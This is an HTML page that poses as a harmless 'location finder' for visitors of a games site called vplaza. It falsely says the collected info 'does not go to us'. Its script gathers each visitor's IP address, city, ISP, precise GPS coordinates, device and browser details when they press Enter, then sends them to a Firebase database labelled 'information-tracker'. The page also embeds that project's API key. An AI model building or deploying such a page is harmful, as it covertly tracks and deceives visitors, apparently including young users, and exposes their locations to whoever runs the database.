<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>New vplaza homepage trick</title>

  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.2/firebase-app.js";
    import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/9.22.2/firebase-database.js";

    const firebaseConfig = {
      apiKey: "AIzaSyC8aFIJcCaybEMKsK_tVI-jGlPfSz7Imhw",
      authDomain: "information-tracker-cbbb4.firebaseapp.com",
      databaseURL: "https://information-tracker-cbbb4-default-rtdb.firebaseio.com",
      projectId: "information-tracker-cbbb4",
      storageBucket: "information-tracker-cbbb4.firebasestorage.app",
      messagingSenderId: "1097118210592",
      appId: "1:1097118210592:web:52323efea25bc0c824ba45"
    };

    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);

    window.saveToFirebase = (data) => {
      const dataRef = ref(db, "visitors-info/");
      push(dataRef, data).then(() => {
        console.log("Data sent to Firebase");
      }).catch(err => {
        console.error("Firebase error:", err);
      });
    };
  </script>

  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 40px;
    }
    #info {
      margin-top: 20px;
      white-space: pre-line;
    }
    button {
      padding: 10px 20px;
      font-size: 16px;
    }
  </style>
</head>
<body>

<h1>Vplaza is down over summer. To continue accessing (with no proxy) do /gamepagev1.html. For now, play around with this location finder.</h1>
<p>Dont worry, the info does not go to us, this is js a fun way to entertain urself while we are gone.</p>
<button id="checkBtn">Enter</button>
<div id="info"></div>

<script>
  document.getElementById('checkBtn').addEventListener('click', () => {
    const infoDiv = document.getElementById('info');
    infoDiv.textContent = 'Retrieving information...';

    const ua = navigator.userAgent;
    const platform = navigator.platform;
    const screenSize = `${screen.width}x${screen.height}`;
    const localTime = new Date().toLocaleString();

    fetch('https://ipapi.co/json')
      .then(res => res.json())
      .then(ip => {
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(
            pos => {
              const coords = `${pos.coords.latitude}, ${pos.coords.longitude}`;
              const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

              const data = {
                ip: ip.ip,
                city: ip.city,
                region: ip.region,
                country: ip.country_name,
                isp: ip.org,
                coords,
                timezone,
                localTime,
                userAgent: ua,
                platform,
                screen: screenSize,
                timestamp: new Date().toISOString()
              };

              if (window.saveToFirebase) window.saveToFirebase(data);

              infoDiv.textContent = JSON.stringify(data, null, 2);
            },
            err => {
              infoDiv.textContent = `Geolocation error: ${err.message}`;
            }
          );
        } else {
          infoDiv.textContent = "Geolocation is not supported.";
        }
      })
      .catch(err => {
        infoDiv.textContent = `IP Fetch Error: ${err.message}`;
      });
  });
</script>

</body>
</html>
